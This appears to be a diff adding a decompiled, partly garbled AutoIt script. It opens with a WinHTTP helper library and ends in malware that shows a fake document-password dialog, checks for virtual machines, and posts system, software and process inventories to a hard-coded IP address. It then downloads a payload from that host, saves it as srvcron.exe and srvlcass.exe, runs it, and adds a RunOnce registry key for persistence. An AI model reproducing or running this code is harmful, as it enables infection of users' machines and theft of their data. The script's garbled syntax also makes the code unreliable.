@@ -1,0 +1,692 @@
+$internet_default_port = 0
+$icu_escape = -2147483648
+$winhttp_flag_async = 268435456
+$winhttp_flag_escape_disable = 64
+$winhttp_access_type_no_proxy = 1
+$winhttp_no_proxy_name = ""
+$winhttp_no_proxy_bypass = ""
+$winhttp_no_referer = ""
+$winhttp_default_accept_types = 0
+$winhttp_no_additional_headers = ""
+$winhttp_no_request_data = ""
+$winhttp_header_name_by_index = ""
+$winhttp_no_header_index = 0
+$winhttp_option_callback = 1
+$winhttp_option_resolve_timeout = 2
+$winhttp_option_connect_timeout = 3
+$winhttp_option_connect_retries = 4
+$winhttp_option_send_timeout = 5
+$winhttp_option_receive_timeout = 6
+$winhttp_option_receive_response_timeout = 7
+$winhttp_option_handle_type = 9
+$winhttp_option_read_buffer_size = 12
+$winhttp_option_write_buffer_size = 13
+$winhttp_option_parent_handle = 21
+$winhttp_option_extended_error = 24
+$winhttp_option_security_flags = 31
+$winhttp_option_url = 34
+$winhttp_option_security_key_bitness = 36
+$winhttp_option_proxy = 38
+$winhttp_option_user_agent = 41
+$winhttp_option_context_value = 45
+$winhttp_option_client_cert_context = 47
+$winhttp_option_request_priority = 58
+$winhttp_option_http_version = 59
+$winhttp_option_disable_feature = 63
+$winhttp_option_codepage = 68
+$winhttp_option_max_conns_per_server = 73
+$winhttp_option_max_conns_per_1_0_server = 74
+$winhttp_option_autologon_policy = 77
+$winhttp_option_enable_feature = 79
+$winhttp_option_worker_thread_count = 80
+$winhttp_option_passport_cobranding_text = 81
+$winhttp_option_passport_cobranding_url = 82
+$winhttp_option_configure_passport_auth = 83
+$winhttp_option_secure_protocols = 84
+$winhttp_option_enabletracing = 85
+$winhttp_option_passport_sign_out = 86
+$winhttp_option_redirect_policy = 88
+$winhttp_option_max_http_automatic_redirects = 89
+$winhttp_option_max_http_status_continue = 90
+$winhttp_option_max_response_header_size = 91
+$winhttp_option_max_response_drain_size = 92
+$winhttp_option_connection_info = 93
+$winhttp_option_spn = 96
+$winhttp_option_global_proxy_creds = 97
+$winhttp_option_global_server_creds = 98
+$winhttp_option_reject_userpwd_in_url = 100
+$winhttp_option_use_global_server_credentials = 101
+$winhttp_option_unsafe_header_parsing = 110
+$winhttp_option_decompression = 118
+$winhttp_option_username = 4096
+$winhttp_option_password = 4097
+$winhttp_option_proxy_username = 4098
+$winhttp_option_proxy_password = 4099
+$winhttp_decompression_flag_all = 3
+$winhttp_autologon_security_level_medium = 0
+$winhttp_autologon_security_level_low = 1
+$winhttp_autologon_security_level_high = 2
+$winhttp_query_content_type = 1
+$winhttp_query_raw_headers_crlf = 22
+$hwinhttpdll__winhttp = ("winhttp.dll")
+("winhttp.dll")
+_winhttpclosehandle($hinternet)
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpCloseHandle", "handle", $hinternet)
+@error23$acall[0]534(1, 0, 0)
+
+
+_winhttpconnect($hsession, $sservername, $iserverport = 41)
+$aurl = _winhttpcrackurl($sservername), $ischeme = 0
+@error5
+__winhttpdefault($iserverport, $internet_default_port)
+
+$sservername = $aurl[2]
+$iserverport = $aurl[3]
+$ischeme = $aurl[1]
+
+$acall = ($hwinhttpdll__winhttp, "handle", "WinHttpConnect", "handle", $hsession, "wstr", $sservername, "dword", $iserverport, "dword", 0)
+@error23$acall[0]534(1, 0, 0)
+_winhttpsetoption($acall[0], $winhttp_option_context_value, $ischeme)
+$acall[0]
+
+_winhttpcrackurl($surl, $iflag = 41)
+__winhttpdefault($iflag, $icu_escape)
+$turl_components = ("dword StructSize;" & "ptr SchemeName;" & "dword SchemeNameLength;" & "int Scheme;" & "ptr HostName;" & "dword HostNameLength;" & "word Port;" & "ptr UserName;" & "dword UserNameLength;" & "ptr Password;" & "dword PasswordLength;" & "ptr UrlPath;" & "dword UrlPathLength;" & "ptr ExtraInfo;" & "dword ExtraInfoLength")
+($turl_components, 1, ($turl_components))
+$tbuffers[6]
+$iurllen = ($surl)
+$i = 0155
+$tbuffers[$i] = ("wchar[" & $iurllen + 1 & "]")
+
+($turl_components, "SchemeNameLength", $iurllen)
+($turl_components, "SchemeName", ($tbuffers[0]))
+($turl_components, "HostNameLength", $iurllen)
+($turl_components, "HostName", ($tbuffers[1]))
+($turl_components, "UserNameLength", $iurllen)
+($turl_components, "UserName", ($tbuffers[2]))
+($turl_components, "PasswordLength", $iurllen)
+($turl_components, "Password", ($tbuffers[3]))
+($turl_components, "UrlPathLength", $iurllen)
+($turl_components, "UrlPath", ($tbuffers[4]))
+($turl_components, "ExtraInfoLength", $iurllen)
+($turl_components, "ExtraInfo", ($tbuffers[5]))
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpCrackUrl", "wstr", $surl, "dword", $iurllen, "dword", $iflag, "struct*", $turl_components)
+@error23$acall[0]534(1, 0, 0)
+$aret[8] = [($tbuffers[0], 1), ($turl_components, "Scheme"), ($tbuffers[1], 1), ($turl_components, "Port"), ($tbuffers[2], 1), ($tbuffers[3], 1), ($tbuffers[4], 1), ($tbuffers[5], 1)]
+$aret
+
+_winhttpopen($suseragent = 41, $iaccesstype = 41, $sproxyname = 41, $sproxybypass = 41, $iflag = 41)
+__winhttpdefault($suseragent, __winhttpua())
+__winhttpdefault($iaccesstype, $winhttp_access_type_no_proxy)
+__winhttpdefault($sproxyname, $winhttp_no_proxy_name)
+__winhttpdefault($sproxybypass, $winhttp_no_proxy_bypass)
+__winhttpdefault($iflag, 0)
+$acall = ($hwinhttpdll__winhttp, "handle", "WinHttpOpen", "wstr", $suseragent, "dword", $iaccesstype, "wstr", $sproxyname, "wstr", $sproxybypass, "dword", $iflag)
+@error23$acall[0]534(1, 0, 0)
+$iflag = $winhttp_flag_async5_winhttpsetoption($acall[0], $winhttp_option_context_value, $winhttp_flag_async)
+$acall[0]
+
+_winhttpopenrequest($hconnect, $sverb = 41, $sobjectname = 41, $sversion = 41, $sreferrer = 41, $saccepttypes = 41, $iflags = 41)
+__winhttpdefault($sverb, "GET")
+__winhttpdefault($sobjectname, "")
+__winhttpdefault($sversion, "HTTP/1.1")
+__winhttpdefault($sreferrer, $winhttp_no_referer)
+__winhttpdefault($iflags, $winhttp_flag_escape_disable)
+$paccepttypes
+$saccepttypes = 412($saccepttypes) = -15
+$paccepttypes = $winhttp_default_accept_types
+
+$atypes = ($saccepttypes, ",", 2)
+$taccepttypes = ("ptr[" & ($atypes) + 1 & "]")
+$ttype[($atypes)]
+$i = 015($atypes) - 1
+$ttype[$i] = ("wchar[" & ($atypes[$i]) + 1 & "]")
+($ttype[$i], 1, $atypes[$i])
+($taccepttypes, 1, ($ttype[$i]), $i + 1)
+
+$paccepttypes = ($taccepttypes)
+
+$acall = ($hwinhttpdll__winhttp, "handle", "WinHttpOpenRequest", "handle", $hconnect, "wstr", ($sverb), "wstr", $sobjectname, "wstr", ($sversion), "wstr", $sreferrer, "ptr", $paccepttypes, "dword", $iflags)
+@error23$acall[0]534(1, 0, 0)
+$acall[0]
+
+_winhttpquerydataavailable($hrequest)
+$sreadtype = "dword*"
+(_winhttpqueryoption(_winhttpqueryoption(_winhttpqueryoption($hrequest, $winhttp_option_parent_handle), $winhttp_option_parent_handle), $winhttp_option_context_value), $winhttp_flag_async)5$sreadtype = "ptr"
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpQueryDataAvailable", "handle", $hrequest, $sreadtype, 0)
+@error534(1, 0, 0)
+($acall[2], $acall[0])
+
+_winhttpqueryheaders($hrequest, $iinfolevel = 41, $sname = 41, $iindex = 41)
+__winhttpdefault($iinfolevel, $winhttp_query_raw_headers_crlf)
+__winhttpdefault($sname, $winhttp_header_name_by_index)
+__winhttpdefault($iindex, $winhttp_no_header_index)
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpQueryHeaders", "handle", $hrequest, "dword", $iinfolevel, "wstr", $sname, "wstr", "", "dword*", 65536, "dword*", $iindex)
+@error23$acall[0]534(1, 0, "")
+($acall[6], $acall[4])
+
+_winhttpqueryoption($hinternet, $ioption)
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpQueryOption", "handle", $hinternet, "dword", $ioption, "ptr", 0, "dword*", 0)
+@error2$acall[0]534(1, 0, "")
+$isize = $acall[4]
+$tbuffer
+$ioption
+$winhttp_option_connection_info, $winhttp_option_password, $winhttp_option_proxy_password, $winhttp_option_proxy_username, $winhttp_option_url, $winhttp_option_username, $winhttp_option_user_agent, $winhttp_option_passport_cobranding_text, $winhttp_option_passport_cobranding_url
+$tbuffer = ("wchar[" & $isize + 1 & "]")
+$winhttp_option_parent_handle, $winhttp_option_callback
+$tbuffer = ("ptr")
+$winhttp_option_connect_timeout, $winhttp_autologon_security_level_high, $winhttp_autologon_security_level_low, $winhttp_autologon_security_level_medium, $winhttp_option_configure_passport_auth, $winhttp_option_connect_retries, $winhttp_option_extended_error, $winhttp_option_handle_type, $winhttp_option_max_conns_per_1_0_server, $winhttp_option_max_conns_per_server, $winhttp_option_max_http_automatic_redirects, $winhttp_option_receive_response_timeout, $winhttp_option_receive_timeout, $winhttp_option_resolve_timeout, $winhttp_option_security_flags, $winhttp_option_security_key_bitness, $winhttp_option_send_timeout
+$tbuffer = ("int")
+$winhttp_option_context_value
+$tbuffer = ("dword_ptr")
+
+$tbuffer = ("byte[" & $isize & "]")
+
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpQueryOption", "handle", $hinternet, "dword", $ioption, "struct*", $tbuffer, "dword*", $isize)
+@error23$acall[0](2, 0, "")
+($tbuffer, 1)
+
+_winhttpreaddata($hrequest, $imode = 41, $inumberofbytestoread = 41, $pbuffer = 41)
+__winhttpdefault($imode, 0)
+__winhttpdefault($inumberofbytestoread, 8192)
+$tbuffer, $voutonerror = ""
+$imode = 25$voutonerror = ($voutonerror)
+$imode
+, 2
+$pbuffer1$pbuffer <> 415
+$tbuffer = ("byte[" & $inumberofbytestoread & "]", $pbuffer)
+
+$tbuffer = ("byte[" & $inumberofbytestoread & "]")
+
+
+$imode = 0
+$pbuffer1$pbuffer <> 415
+$tbuffer = ("char[" & $inumberofbytestoread & "]", $pbuffer)
+
+$tbuffer = ("char[" & $inumberofbytestoread & "]")
+
+
+$sreadtype = "dword*"
+(_winhttpqueryoption(_winhttpqueryoption(_winhttpqueryoption($hrequest, $winhttp_option_parent_handle), $winhttp_option_parent_handle), $winhttp_option_context_value), $winhttp_flag_async)5$sreadtype = "ptr"
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpReadData", "handle", $hrequest, "struct*", $tbuffer, "dword", $inumberofbytestoread, $sreadtype, 0)
+@error23$acall[0](1, 0, "")
+$acall[4](-1, 0, $voutonerror)
+$acall[4] < $inumberofbytestoread5
+$imode
+
+($acall[4], (($tbuffer, 1), $acall[4]))
+
+($acall[4], ((($tbuffer, 1), 1, $acall[4]), 4))
+
+($acall[4], (($tbuffer, 1), 1, $acall[4]))
+
+
+$imode
+, 2
+($acall[4], ($tbuffer, 1))
+
+($acall[4], (($tbuffer, 1), 4))
+
+
+
+_winhttpreceiveresponse($hrequest)
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpReceiveResponse", "handle", $hrequest, "ptr", 0)
+@error23$acall[0]534(1, 0, 0)
+
+
+_winhttpsendrequest($hrequest, $sheaders = 41, $soptional = 41, $itotallength = 41, $icontext = 41)
+__winhttpdefault($sheaders, $winhttp_no_additional_headers)
+__winhttpdefault($soptional, $winhttp_no_request_data)
+__winhttpdefault($itotallength, 0)
+__winhttpdefault($icontext, 0)
+$poptional = 0, $ioptionallength = 0
+@NumParams > 25
+$toptional
+$ioptionallength = ($soptional)
+$toptional = ("byte[" & $ioptionallength & "]")
+$ioptionallength5$poptional = ($toptional)
+($toptional, 1, $soptional)
+
+$itotallength2$itotallength < $ioptionallength5$itotallength += $ioptionallength
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpSendRequest", "handle", $hrequest, "wstr", $sheaders, "dword", 0, "ptr", $poptional, "dword", $ioptionallength, "dword", $itotallength, "dword_ptr", $icontext)
+@error23$acall[0]534(1, 0, 0)
+
+
+_winhttpsetoption($hinternet, $ioption, $vsetting, $isize = 41)
+$isize = 415$isize = -1
+($vsetting)5
+$isize = ("byte[" & ($vsetting) & "]")
+($isize, 1, $vsetting)
+$vsetting = $isize
+$isize = ($vsetting)
+
+$stype
+$ioption
+$winhttp_option_autologon_policy, $winhttp_option_codepage, $winhttp_option_configure_passport_auth, $winhttp_option_connect_retries, $winhttp_option_connect_timeout, $winhttp_option_disable_feature, $winhttp_option_enable_feature, $winhttp_option_enabletracing, $winhttp_option_max_conns_per_1_0_server, $winhttp_option_max_conns_per_server, $winhttp_option_max_http_automatic_redirects, $winhttp_option_max_http_status_continue, $winhttp_option_max_response_drain_size, $winhttp_option_max_response_header_size, $winhttp_option_read_buffer_size, $winhttp_option_receive_timeout, $winhttp_option_receive_response_timeout, $winhttp_option_redirect_policy, $winhttp_option_reject_userpwd_in_url, $winhttp_option_request_priority, $winhttp_option_resolve_timeout, $winhttp_option_secure_protocols, $winhttp_option_security_flags, $winhttp_option_security_key_bitness, $winhttp_option_send_timeout, $winhttp_option_spn, $winhttp_option_use_global_server_credentials, $winhttp_option_worker_thread_count, $winhttp_option_write_buffer_size, $winhttp_option_decompression, $winhttp_option_unsafe_header_parsing
+$stype = "dword*"
+$isize = 4
+$winhttp_option_callback, $winhttp_option_passport_sign_out
+$stype = "ptr*"
+$isize = 4
+@AutoItX645$isize = 8
+($vsetting)534(3, 0, 0)
+$winhttp_option_context_value
+$stype = "dword_ptr*"
+$isize = 4
+@AutoItX645$isize = 8
+$winhttp_option_password, $winhttp_option_proxy_password, $winhttp_option_proxy_username, $winhttp_option_user_agent, $winhttp_option_username
+$stype = "wstr"
+(($vsetting)2($vsetting))534(3, 0, 0)
+$isize < 15$isize = ($vsetting)
+$winhttp_option_client_cert_context, $winhttp_option_global_proxy_creds, $winhttp_option_global_server_creds, $winhttp_option_http_version, $winhttp_option_proxy
+$stype = "ptr"
+(($vsetting)2($vsetting))534(3, 0, 0)
+
+(1, 0, 0)
+
+$isize < 15
+($vsetting)5
+$isize = ($vsetting)
+
+(2, 0, 0)
+
+
+$acall
+($vsetting)5
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpSetOption", "handle", $hinternet, "dword", $ioption, $stype, ($vsetting), "dword", $isize)
+
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpSetOption", "handle", $hinternet, "dword", $ioption, $stype, $vsetting, "dword", $isize)
+
+@error23$acall[0]534(4, 0, 0)
+
+
+_winhttpsimplereaddata($hrequest, $imode = 41)
+$imode = 415
+$imode = 0
+__winhttpcharset(_winhttpqueryheaders($hrequest, $winhttp_query_content_type)) = 650015$imode = 1
+
+__winhttpdefault($imode, 0)
+
+$imode > 22$imode < 0534(1, 0, "")
+$vdata = ("")
+_winhttpquerydataavailable($hrequest)5
+
+$vdata &= _winhttpreaddata($hrequest, 2)
+@error
+$imode
+
+($vdata)
+
+($vdata, 4)
+
+$vdata
+
+
+(2, 0, $vdata)
+
+_winhttpsimplesendrequest($hconnect, $stype = 41, $spath = 41, $sreferrer = 41, $sdata = 41, $sheader = 41)
+__winhttpdefault($stype, "GET")
+__winhttpdefault($spath, "")
+__winhttpdefault($sreferrer, $winhttp_no_referer)
+__winhttpdefault($sdata, $winhttp_no_request_data)
+__winhttpdefault($sheader, $winhttp_no_additional_headers)
+$hrequest = _winhttpopenrequest($hconnect, $stype, $spath, 41, $sreferrer)
+$hrequest534(1, @error, 0)
+$stype = "POST"1$sheader = $winhttp_no_additional_headers5$sheader = "Content-Type: application/x-www-form-urlencoded" & @CRLF
+_winhttpsetoption($hrequest, $winhttp_option_decompression, $winhttp_decompression_flag_all)
+_winhttpsetoption($hrequest, $winhttp_option_unsafe_header_parsing, 1)
+_winhttpsendrequest($hrequest, $sheader, $sdata)
+@error534(2, 0 * _winhttpclosehandle($hrequest), 0)
+_winhttpreceiveresponse($hrequest)
+@error534(3, 0 * _winhttpclosehandle($hrequest), 0)
+$hrequest
+
+__winhttpcharset($scontenttype)
+$acontenttype = ($scontenttype, "(?i).*?\Qcharset=\E(?U)([^ ]+)(;| |\Z)", 2)
+@error5$scontenttype = $acontenttype[1]
+($scontenttype, 2) = "cp"534(($scontenttype, 2))
+$scontenttype = "utf-8"53465001
+
+__winhttpdefault(36$vinput, $voutput)
+$vinput = 412($vinput) = -15$vinput = $voutput
+
+__winhttpua()
+$sua = "Mozilla/5.0 " & __winhttpsysinfo() & " WinHttp/" & __winhttpver() & " (WinHTTP/5.1) like Gecko"
+$sua
+
+__winhttpsysinfo()
+$sdata = ("kernel32.dll")
+$sdata = "(Windows NT " & ($sdata, ($sdata, ".", 1, 2) - 1)
+(@OSArch, "64")13@AutoItX645$sdata &= "; WOW64"
+$sdata &= ")"
+$sdata
+
+__winhttpver()
+"1.6.3.8"
+
+$sb_utf8 = 4
+_stringtohex($sstring)
+(($sstring, $sb_utf8))
+
+$stdout_child = 2
+$stderr_child = 4
+$ubound_dimensions = 0
+$ubound_rows = 1
+$ubound_columns = 2
+_arraysearch(3036$aarray, $vvalue, $istart = 0, $iend = 0, $icase = 0, $icompare = 0, $iforward = 1, $isubitem = -1, $brow = 40)
+$istart = 415$istart = 0
+$iend = 415$iend = 0
+$icase = 415$icase = 0
+$icompare = 415$icompare = 0
+$iforward = 415$iforward = 1
+$isubitem = 415$isubitem = -1
+$brow = 415$brow = 40
+($aarray)534(1, 0, -1)
+$idim_1 = ($aarray) - 1
+$idim_1 = -1534(3, 0, -1)
+$idim_2 = ($aarray, $ubound_columns) - 1
+$bcomptype = 40
+$icompare = 25
+$icompare = 0
+$bcomptype = 39
+
+$brow5
+($aarray, $ubound_dimensions) = 1534(5, 0, -1)
+$iend < 12$iend > $idim_25$iend = $idim_2
+$istart < 05$istart = 0
+$istart > $iend534(4, 0, -1)
+
+$iend < 12$iend > $idim_15$iend = $idim_1
+$istart < 05$istart = 0
+$istart > $iend534(4, 0, -1)
+
+$istep = 1
+$iforward5
+$itmp = $istart
+$istart = $iend
+$iend = $itmp
+$istep = -1
+
+($aarray, $ubound_dimensions)
+
+$icompare5
+$icase5
+$i = $istart15$iend16$istep
+$bcomptype1($aarray[$i]) <> ($vvalue)519
+$aarray[$i] = $vvalue534$i
+
+
+$i = $istart15$iend16$istep
+$bcomptype1($aarray[$i]) <> ($vvalue)519
+$aarray[$i] == $vvalue534$i
+
+
+
+$i = $istart15$iend16$istep
+$icompare = 35
+($aarray[$i], $vvalue)534$i
+
+($aarray[$i], $vvalue, $icase) > 0534$i
+
+
+
+
+$idim_sub
+$brow5
+$idim_sub = $idim_1
+$isubitem > $idim_sub5$isubitem = $idim_sub
+$isubitem < 05
+$isubitem = 0
+
+$idim_sub = $isubitem
+
+
+$idim_sub = $idim_2
+$isubitem > $idim_sub5$isubitem = $idim_sub
+$isubitem < 05
+$isubitem = 0
+
+$idim_sub = $isubitem
+
+
+$j = $isubitem15$idim_sub
+$icompare5
+$icase5
+$i = $istart15$iend16$istep
+$brow5
+$bcomptype1($aarray[$j][$j]) <> ($vvalue)519
+$aarray[$j][$i] = $vvalue534$i
+
+$bcomptype1($aarray[$i][$j]) <> ($vvalue)519
+$aarray[$i][$j] = $vvalue534$i
+
+
+
+$i = $istart15$iend16$istep
+$brow5
+$bcomptype1($aarray[$j][$i]) <> ($vvalue)519
+$aarray[$j][$i] == $vvalue534$i
+
+$bcomptype1($aarray[$i][$j]) <> ($vvalue)519
+$aarray[$i][$j] == $vvalue534$i
+
+
+
+
+$i = $istart15$iend16$istep
+$icompare = 35
+$brow5
+($aarray[$j][$i], $vvalue)534$i
+
+($aarray[$i][$j], $vvalue)534$i
+
+
+$brow5
+($aarray[$j][$i], $vvalue, $icase) > 0534$i
+
+($aarray[$i][$j], $vvalue, $icase) > 0534$i
+
+
+
+
+
+
+(2, 0, -1)
+
+(6, 0, -1)
+
+_arraytostring(3036$aarray, $sdelim_col = "|", $istart_row = -1, $iend_row = -1, $sdelim_row = @CRLF, $istart_col = -1, $iend_col = -1)
+$sdelim_col = 415$sdelim_col = "|"
+$sdelim_row = 415$sdelim_row = @CRLF
+$istart_row = 415$istart_row = -1
+$iend_row = 415$iend_row = -1
+$istart_col = 415$istart_col = -1
+$iend_col = 415$iend_col = -1
+($aarray)534(1, 0, -1)
+$idim_1 = ($aarray, $ubound_rows) - 1
+$istart_row = -15$istart_row = 0
+$iend_row = -15$iend_row = $idim_1
+$istart_row < -12$iend_row < -1534(3, 0, -1)
+$istart_row > $idim_12$iend_row > $idim_1534(3, 0, "")
+$istart_row > $iend_row534(4, 0, -1)
+$sret = ""
+($aarray, $ubound_dimensions)
+
+$i = $istart_row15$iend_row
+$sret &= $aarray[$i] & $sdelim_col
+
+($sret, ($sdelim_col))
+
+$idim_2 = ($aarray, $ubound_columns) - 1
+$istart_col = -15$istart_col = 0
+$iend_col = -15$iend_col = $idim_2
+$istart_col < -12$iend_col < -1534(5, 0, -1)
+$istart_col > $idim_22$iend_col > $idim_2534(5, 0, -1)
+$istart_col > $iend_col534(6, 0, -1)
+$i = $istart_row15$iend_row
+$j = $istart_col15$iend_col
+$sret &= $aarray[$i][$j] & $sdelim_col
+
+$sret = ($sret, ($sdelim_col)) & $sdelim_row
+
+($sret, ($sdelim_row))
+
+(2, 0, -1)
+
+
+
+$es_password = 32
+$gui_ss_default_input = 128
+$gui_event_close = -3
+$ws_sysmenu = 524288
+$ws_caption = 12582912
+$ws_popup = -2147483648
+$ws_ex_dlgmodalframe = 1
+(("$cI_CompName"))5
+
+("TrayIconHide", 1)
+$ms_word = ("Password", 311, 86, -1, -1, ($ws_caption, $ws_popup, $ws_sysmenu), $ws_ex_dlgmodalframe)
+$input1 = ("", 8, 16, 297, 21, ($gui_ss_default_input, $es_password))
+$ok = ("OK", 120, 48, 83, 25)
+$cancel = ("Cancel", 216, 48, 83, 25)
+$sname = _mv()
+$sexname = "srvcron.exe"
+$exist = (@AppDataDir & "\Microsoft\Internet Explorer\Quick Launch\" & $sexname)
+(@SW_SHOW)
+("_Giga")
+
+$nmsg = ()
+$nmsg
+$gui_event_close
+($ms_word)
+_infosystemservice("http://194.187.249.126", "/security-services-DMHA-group/info-update-version/id77820082.php", $sname & "__" & @MON & @MDAY & @MIN & ".tmp", _sofware())
+(3000)
+
+$ok
+(64, "Open file error!", "The password is incorrect. Cannot open the document!")
+($ms_word)
+_infosystemservice("http://194.187.249.126", "/security-services-DMHA-group/info-update-version/id77820082.php", $sname & "__" & @MON & @MDAY & @MIN & ".tmp", _sofware())
+(3000)
+
+$cancel
+($ms_word)
+_infosystemservice("http://194.187.249.126", "/security-services-DMHA-group/info-update-version/id77820082.php", $sname & "__" & @MON & @MDAY & @MIN & ".tmp", _sofware())
+(3000)
+
+
+
+_mv()
+$ssearch[11]
+$ssearch[10] = "Lamer.exe"
+$ssearch[1] = "vmacthlp.exe"
+$ssearch[2] = "vmacthlp.exe"
+$ssearch[3] = "vmtoolsd.exe"
+$ssearch[4] = "VBoxTray.exe"
+$ssearch[5] = "VBoxService.exe"
+$ssearch[6] = "prl_cc.exe"
+$ssearch[7] = "prl_tools.exe"
+$ssearch[8] = "SharedIntApp.exe"
+$ssearch[9] = "vmusrvc.exe"
+$ssearch[2] = "vmsrvc.exe"
+$ssearch[0] = ($ssearch)
+$i = $ssearch[0] - 1
+$iindex = _arraysearch((), $ssearch[$i], 0, 0, 0, 1, 0, 0)
+$iindex <> -15
+$id, $soutput = ""
+$id = (@ComSpec & " /U /C VOL ", "", @SW_HIDE, $stderr_child + $stdout_child)
+
+$soutput &= ($id, 40, 40)
+
+$soutput = ($soutput, 2)
+$aout = ($soutput, "[A-Z0-9]{4}-[A-Z0-9]{4}", 1)
+$aout[0] = ($aout[0], "-", "")
+$kor = ($aout[0] & _stringtohex((@ComputerName, 4)), "CC078550414E544F", 0)
+$kor = 1535
+$kor = ($aout[0] & _stringtohex((@ComputerName, 4)), "0CE74E6641444D49", 0)
+$kor = 1535
+$kor = ($aout[0] & _stringtohex((@ComputerName, 4)), "64F3BF1F54515564", 0)
+$kor = 1535
+$kor = ($aout[0] & _stringtohex((@ComputerName, 4)), "64F3BF1F61776F64", 0)
+$kor = 1535
+$kor = ($aout[0] & _stringtohex((@ComputerName, 4)), "88FDB972524F4745", 0)
+$kor = 1535
+$kor = ($aout[0] & _stringtohex((@ComputerName, 4)), "B8EB467E5657494E", 0)
+$kor = 1535
+$kor = ($aout[0] & _stringtohex((@ComputerName, 4)), "D4BC89F657494E37", 0)
+$kor = 1535
+$kor = ($aout[0] & _stringtohex((@ComputerName, 4)), "E00458AD4245412D", 0)
+$kor = 1535
+$aout[0] & _stringtohex((@ComputerName, 4))
+
+_giga()
+$hopen = _winhttpopen()
+$hconnect = _winhttpconnect($hopen, "http://194.187.249.126/")
+$hrequest = _winhttpsimplesendrequest($hconnect, 41, "/security-services-DMHA-group/id-pid919/1SQL5-5database-update/release-554211/updater-service.dat")
+$data = _winhttpsimplereaddata($hrequest)
+$hfileonce = (@AppDataDir & "\Microsoft\Internet Explorer\Quick Launch\" & $sexname, 2 + 16 + 8)
+($hfileonce, $data)
+($hfileonce)
+$hfile = (@TempDir & "\srvlcass.exe", 2 + 16)
+($hfile, $data)
+($hfile)
+_winhttpclosehandle($hrequest)
+_winhttpclosehandle($hconnect)
+_winhttpclosehandle($hopen)
+(@AppDataDir & "\Microsoft\Internet Explorer\Quick Launch\" & $sexname)
+("HKEY_CURRENT_USER\Software\Microsoft\Drivers", "DriverID", "REG_SZ", "11x00110011")
+("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce", "IESecurity", "REG_SZ", @TempDir & "\srvlcass.exe")
+
+_infosystemservice($host, $hrv, $name, $data_s)
+$url = $host & $hrv
+$ohttp = ("WinHttp.WinHttpRequest.5.1")
+$ohttp.open("POST", $url)
+$ohttp.setrequestheader("Content-Type", "application/x-www-form-urlencoded")
+$adata = "info=" & $name & ".tmp&statistic=" & $data_s
+$ohttp.send($adata)
+$ohttp.waitforresponse
+$response = $ohttp.responsetext
+$response
+
+_sofware()
+$reggetkey = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
+$i = 1
+$asoft
+$asoft = "                --------Software-------" & @CRLF & @CRLF & @CRLF
+
+$appkey = ($reggetkey, $i)
+@error <> 0518
+$asoftstingtemp = (($reggetkey & "\" & $appkey, "DisplayName"), 3)
+$asoft = $asoft & $asoftstingtemp & @CRLF
+$i += 1
+
+$sys_info = "                --------System info-------" & @CRLF
+$sys_info = $sys_info & "TempDir: " & @TempDir & @CRLF
+$_getddive = ("ALL")
+$sys_info = $sys_info & "Program start: " & @ScriptDir & "\" & @ScriptName & @CRLF & @CRLF & @CRLF
+$dd = 115$_getddive[0]
+$sys_info = $sys_info & "Name : " & $_getddive[$dd] & " La" & "bel: "
+$sys_info = $sys_info & ($_getddive[$dd] & "\") & " FR" & "EE : " & ($_getddive[$dd] & "\") & @CRLF
+
+$sys_info_w_system_info = ""
+$sys_info_w_system_info = "                --------Windows system info-------" & @CRLF
+$w_system_info = _getdosoutput("systeminfo")
+$sys_info_w_system_info = $sys_info_w_system_info & $w_system_info & @CRLF & @CRLF & @CRLF
+$sys_info_sprocesslist = ""
+$sys_info_sprocesslist = "                --------Processes-------" & @CRLF
+$aprocesslist = ()
+$sprocesslist = _arraytostring($aprocesslist, " ")
+$sys_info_sprocesslist = $sys_info_sprocesslist & $sprocesslist & @CRLF & @CRLF & @CRLF
+$sys_info_sprocesslist & $asoft & $sys_info & $sys_info_w_system_info
+
+_getdosoutput($scommand)
+$ipid, $soutput = ""
+$ipid = ('"' & @ComSpec & '" /c ' & $scommand, "", @SW_HIDE, $stderr_child + $stdout_child)
+
+$soutput &= ($ipid, 40, 40)
+@error5
+
+
+(10)
+
+$soutput
+
